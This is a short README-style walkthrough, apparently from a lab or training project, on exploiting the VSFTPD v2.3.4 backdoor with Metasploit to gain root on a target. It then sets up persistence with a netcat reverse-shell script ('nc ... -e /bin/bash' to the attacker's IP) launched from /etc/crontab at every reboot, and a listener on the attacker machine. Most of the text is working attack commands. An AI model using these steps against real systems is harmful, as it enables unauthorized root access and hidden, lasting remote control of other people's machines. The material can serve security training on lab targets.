# VSFTPD v2.3.4 Backdoor Exploit

## Description
This project demonstrates how to exploit the VSFTPD v2.3.4 backdoor vulnerability using the Metasploit Framework. The exploit provides root access to the vulnerable system, and this project also demonstrates how to maintain persistent access by setting up a Netcat backdoor.

## Prerequisites
- **Metasploit Framework**
- **Netcat (nc)**
- A vulnerable target running **VSFTPD v2.3.4**

## Steps

### 1. Launch Metasploit and Exploit the Target
Open Metasploit and run the following commands:

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.15  # Target IP
exploit

```
### 2. Set Up a Backdoor for Persistence
On the compromised target machine, create a backdoor script and configure it to run at startup:

```
echo "nc 192.168.1.26 5555 -e /bin/bash" > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
echo "@reboot /tmp/backdoor.sh" >> /etc/crontab

```
### 3. Start a Netcat Listener 
On your attacker machine, set up a listener to receive the connection from the backdoor

```
nc -lvnp 5555

```
## Verification
To ensure the backdoor is working correctly:
### 1.Restart the Target System:
```
sudo reboot

```
### 2.Check the Netcat Listener:
Ensure that the Netcat listener on your attacker machine is running and waiting for connections:
```
nc -lvnp 5555

```
After rebooting the target system, the backdoor script should run on startup, establishing a connection to your attacker machine
